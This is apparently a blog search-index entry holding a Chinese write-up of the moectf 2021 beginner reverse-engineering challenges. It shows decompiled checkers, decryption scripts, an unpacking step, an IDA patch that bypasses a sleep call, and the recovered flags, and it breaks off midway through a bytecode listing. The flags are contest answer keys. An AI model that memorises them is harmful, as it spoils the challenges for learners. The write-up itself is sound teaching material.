<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>moectf 题解记录</title>
      <link href="/2021/09/26/moectf/"/>
      <url>/2021/09/26/moectf/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><blockquote><p>有一个人前来参加CTF</p></blockquote><p>听说是入门级别, 试下水, 结果发现挺有意思.<br><a href="https://www.moectf.online/">网站链接</a></p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><p>歪比巴卜</p><h3 id="welcome-to-the-world-of-re"><a href="#welcome-to-the-world-of-re" class="headerlink" title="welcome_to_the_world_of_re"></a>welcome_to_the_world_of_re</h3><p>IDA载入, 容易看出这几行是检验过程:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> *))funcs_4016DE[i])(&amp;unk_407040);</span><br></pre></td></tr></table></figure><p><code>unk_407040</code>是你输入的数据, <code>for</code>里有4个函数, 逐个打开查看</p><div class="table-container"><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td><code>sub_401550</code></td><td>检查长度</td></tr><tr><td><code>sub_401585</code></td><td>检查是否是”moectf{“开头</td></tr><tr><td><code>sub_4015C5</code></td><td>检查结尾是否为”}</td></tr><tr><td><code>sub_401606</code></td><td>检查flag内容, 发现flag直接放在<code>off_403028</code>里</td></tr></tbody></table></div><p>如果事先发现没有加密的话, 也可以直接记事本打开搜”moectf{“.</p><blockquote><p>moectf{W31C0Me_t0_m03CTF_2021_w0o0o0oooo0ooooo0o0oooo0!!!}</p></blockquote><h3 id="EinfachRe"><a href="#EinfachRe" class="headerlink" title="EinfachRe"></a>EinfachRe</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Destination[<span class="number">7</span>]; <span class="comment">// [esp+16h] [ebp-1Ah] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v[<span class="number">14</span>]; <span class="comment">// [esp+1Dh] [ebp-13h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+2Bh] [ebp-5h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, enflag);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your flag:&quot;</span>);</span><br><span class="line">  gets(v);</span><br><span class="line">  <span class="keyword">if</span> ( check(v) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v[i] ^ v[i + <span class="number">7</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v3 != Destination[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;try again!!!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;your flag is moectf&#123;******&#125;&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulations!!!!!!!!!!!!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong length!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>打开发现事狗屁不通文章生成器</del><br>打开发现是简单的异或加密, 又知道前7个字母是”moectf{“, 然后就可以写脚本啦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0x28</span>, <span class="number">0x15</span>, <span class="number">0x3A</span>, <span class="number">0x1B</span>, <span class="number">0x44</span>, <span class="number">0x14</span>, <span class="number">0x06</span>]</span><br><span class="line">k = <span class="string">&#x27;moectf&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)):</span><br><span class="line">    k += <span class="built_in">chr</span>(<span class="built_in">ord</span>(k[i]) ^ c[i])</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><blockquote><p>moectf{Ez_x0r}</p></blockquote><h3 id="Realezpy"><a href="#Realezpy" class="headerlink" title="Realezpy"></a>Realezpy</h3><p>是python脚本的字节码, 用uncompyle6反编译一下, 得到下面的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.0 (tags/v3.8.0:fa919fd, Oct 14 2019, 19:37:50) [MSC v.1916 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: Ezpython.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2021-07-28 10:01:40</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 931 bytes</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">c = [<span class="number">119</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">74</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">114</span>, <span class="number">48</span>, <span class="number">120</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">95</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">99</span>, <span class="number">105</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">a</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(a[i]) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">            result.append((<span class="built_in">ord</span>(a[i]) + <span class="number">114</span> - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= <span class="built_in">ord</span>(a[i]) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">            result.append((<span class="built_in">ord</span>(a[i]) + <span class="number">514</span> - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(<span class="built_in">ord</span>(a[i]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ipt = <span class="built_in">input</span>(<span class="string">&#x27;Plz give me your flag:&#x27;</span>)</span><br><span class="line">out = encrypt(ipt)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ipt) != <span class="built_in">len</span>(c):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong lenth~&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> out[i] != c[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Plz try again?&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Congratulations!!!&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;enjoy the beauty of python ~~~ &#x27;</span>)</span><br><span class="line">            <span class="keyword">import</span> this</span><br></pre></td></tr></table></figure><p>观察一下, 可以写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">119</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">74</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">114</span>, <span class="number">48</span>, <span class="number">120</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">95</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">99</span>, <span class="number">105</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= c[i] &lt;= <span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> (c[i] - <span class="number">514</span> - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">    <span class="keyword">elif</span> (<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= c[i] &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>)):</span><br><span class="line">        <span class="keyword">return</span> (c[i] - <span class="number">114</span> - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> c[i];</span><br><span class="line"></span><br><span class="line">opt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    opt += <span class="built_in">chr</span>(dec(i))</span><br><span class="line"><span class="built_in">print</span>(opt)</span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p>好了, 以上就是小编整理的关于Realezpy的内容了, 看看下面的flag吧.</p><blockquote><p>moectf{Pyth0n_1s_so0o0o0o0_easy}</p></blockquote><h3 id="A-game"><a href="#A-game" class="headerlink" title="A_game"></a>A_game</h3><p>打開康康是什麼遊戲</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">_main(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;---  moectf2021  ---&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; [A_game] Welcome to moectf2021.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s play a game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now input your answer, and if you are right, I will give you flag&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input : &quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str));</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">49</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s not enough.&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !box[<span class="number">9</span> * i + j] )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = v10++;</span><br><span class="line">        box[<span class="number">9</span> * i + j] = Str[v3] - <span class="number">48</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  check1();</span><br><span class="line">  check2();</span><br><span class="line">  check3();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Congratulations!!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enjoy the beauty of reverse and sudoku!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And here is your flag : moectf&#123;&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="built_in">strlen</span>(Str); ++k )</span><br><span class="line">    <span class="built_in">putchar</span>(Str[k] ^ magic[k]);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">125</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面给了提示, 是数独. 程序把你填的数放到残缺的数独题中, 如果经过检验通过就可以自动算出flag.</p><p>数独题如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 0 5 0 0 4 3 6 0</span><br><span class="line">0 0 0 0 5 0 0 2 4</span><br><span class="line">0 4 9 6 7 0 0 0 0</span><br><span class="line">1 0 6 0 2 0 0 3 0</span><br><span class="line">9 0 0 7 0 0 1 0 8</span><br><span class="line">0 3 0 0 0 5 0 9 0</span><br><span class="line">2 0 0 5 0 7 0 0 9</span><br><span class="line">7 0 4 0 0 0 8 0 0</span><br><span class="line">0 9 0 0 4 0 0 0 6</span><br></pre></td></tr></table></figure><p>0是要填的, 然后直接去网上找解题器.</p><p><img src="/pictures/moectf_sudoku.png" alt="答案"></p><p>诶真香~~</p><blockquote><p>moectf{S0_As_I_prAy_Un1imited_B1ade_WOrks—-E1m1ya_Shiro}</p></blockquote><h3 id="clothes"><a href="#clothes" class="headerlink" title="clothes"></a>clothes</h3><p>打开发现不对劲, 哦, 原来是加壳了. 查壳发现是aspack. 然后去吾爱上找了个脱壳器, 脱壳后程序无法启动, 不过问题不大, 直接IDA打开即可.</p><p>是异或加密, 直接写解密代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span></span><br><span class="line">a[] = &#123;<span class="number">0x1E</span>, <span class="number">0x2A</span>, <span class="number">0x4E</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x0F</span>, <span class="number">0x28</span>, <span class="number">0x39</span>, <span class="number">0x71</span>, <span class="number">0x3C</span>, <span class="number">0x4F</span>, <span class="number">0x4C</span>, <span class="number">0x6E</span>, <span class="number">0x35</span>, <span class="number">0x22</span>, <span class="number">0x3E</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x31</span>, <span class="number">0x7D</span>, <span class="number">0x2C</span>, <span class="number">0x36</span>, <span class="number">0x16</span>, <span class="number">0x04</span>, <span class="number">0x22</span>, <span class="number">0x1A</span>, <span class="number">0x53</span>, <span class="number">0x07</span>, <span class="number">0x73</span>, <span class="number">0x38</span>&#125;,</span><br><span class="line">b[] = &#123;<span class="number">0x73</span>, <span class="number">0x45</span>, <span class="number">0x2B</span>, <span class="number">0x47</span>, <span class="number">0x57</span>, <span class="number">0x69</span>, <span class="number">0x53</span>, <span class="number">0x0D</span>, <span class="number">0x44</span>, <span class="number">0x4C</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x05</span>, <span class="number">0x6A</span>, <span class="number">0x13</span>, <span class="number">0x4D</span>, <span class="number">0x57</span>, <span class="number">0x31</span>, <span class="number">0x4B</span>, <span class="number">0x22</span>, <span class="number">0x58</span>, <span class="number">0x06</span>, <span class="number">0x49</span>, <span class="number">0x71</span>, <span class="number">0x4C</span>, <span class="number">0x6A</span>, <span class="number">0x32</span>, <span class="number">0x64</span>, <span class="number">0x18</span>, <span class="number">0x45</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i; <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) <span class="built_in">putchar</span>(a[i] ^ b[i]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>为什么不用python? 问就是当时不会.</del></p><blockquote><p>moectf{45pack_1s_3z_t0_unpack}</p></blockquote><h3 id="大佬请喝coffee"><a href="#大佬请喝coffee" class="headerlink" title="大佬请喝coffee"></a>大佬请喝coffee</h3><p><img src="https://java.com/favicon.ico" alt=""></img></p><p>用jd-gui打开, 发现是矩阵, 脑袋开始痛了.<br>但是, matlab yyds!!!</p><p>问题不大, 把代码整理下, 得到下面的:</p><script type="math/tex; mode=display">\begin{bmatrix}4778 & 3659 & 9011 & 5734 & 4076 & 6812 & 8341 & 6765 & 7435 \\4449 & 5454 & 4459 & 5800 & 6685 & 6120 & 7357 & 3561 & 5199 \\3188 & 6278 & 9411 & 5760 & 9909 & 7618 & 7184 & 4791 & 8686 \\8827 & 7419 & 7033 & 9306 & 7300 & 5774 & 6588 & 5541 & 4628 \\5707 & 5793 & 4589 & 6679 & 3972 & 5876 & 6668 & 5951 & 9569 \\9685 & 7370 & 4648 & 7230 & 9614 & 9979 & 8309 & 9631 & 9272 \\6955 & 8567 & 7949 & 8699 & 3284 & 6647 & 3175 & 8506 & 6552 \\4323 & 4706 & 8081 & 7900 & 4862 & 9544 & 5211 & 7443 & 5676 \\3022 & 8999 & 5058 & 4529 & 3940 & 4279 & 4606 & 3428 & 8889 \\\end{bmatrix} x = \begin{bmatrix}5711942\\4885863\\6387690\\6077067\\5492294\\7562511\\5970432\\5834523\\4681110\\\end{bmatrix}</script><p>《易得》 $ x = \begin{bmatrix}69 &amp; 88 &amp; 99 &amp; 97 &amp; 108 &amp; 105 &amp; 98 &amp; 117 &amp; 114 \end{bmatrix}^\mathrm{T} $</p><p><code>chr()</code>一下, 结果是EXcalibur.</p><blockquote><p>moectf{EXcalibur}</p></blockquote><h3 id="time2go"><a href="#time2go" class="headerlink" title="time2go"></a>time2go</h3><p>打开发现程序很复杂, 后来在知道这是go语言编译后的结果. 真正的程序入口函数是<code>main_main</code>.<br>然后发现程序一直在输出-延迟-输出-延迟. 砸瓦鲁多? 不存在的, 直接把延时函数<code>time_Sleep</code>给屏蔽掉, 方法是打开函数并切到汇编模式,对着函数第一句<code>mov rcx, gs:28h</code>, Edit-&gt;Patch program-&gt;Assemble, 改成<code>ret</code>, 让它直接返回, 别忘了Edit-&gt;Patch program-&gt;Apply patches. 运行程序, 游戏结束!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">welcome to moectf2021!</span><br><span class="line">↓↓↓↓Here&#x27;s your flag↓↓↓↓</span><br><span class="line">moectf&#123;G0_1an8uag3_1</span><br><span class="line">++++++++++++++++++++++++++++++++++</span><br><span class="line">Congratulations!!!!</span><br><span class="line">You are very close to success!!</span><br><span class="line">Try to find the remaining flag!!</span><br><span class="line">++++++++++++++++++++++++++++++++++</span><br></pre></td></tr></table></figure><p>然而发现flag只有一半. 无奈地再次分析, 最后花了七八分钟在<code>main_fun2</code>函数的<code>main_CanuFindme</code>变量里找到了后面一半:5_amaz1ng}.</p><blockquote><p>moectf{G0_1an8uag3_15_amaz1ng}</p></blockquote><h3 id="midpython"><a href="#midpython" class="headerlink" title="midpython"></a>midpython</h3><p>又是一个python程序, 不同的是这个被编译成了exe.<br>在网上找了<a href="https://blog.csdn.net/weixin_44362969/article/details/105616531">这篇文章</a>, 按照他的方法, 我得到了MidPython文件, 补上文件的前十六个字节, 修改后缀为pyc, 它终于可以运行了!!!<br>可能是我的打开方式有问题, uncompyle6不能反编译它, 于是我从网上下载了pycdas程序, 得到下面的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span 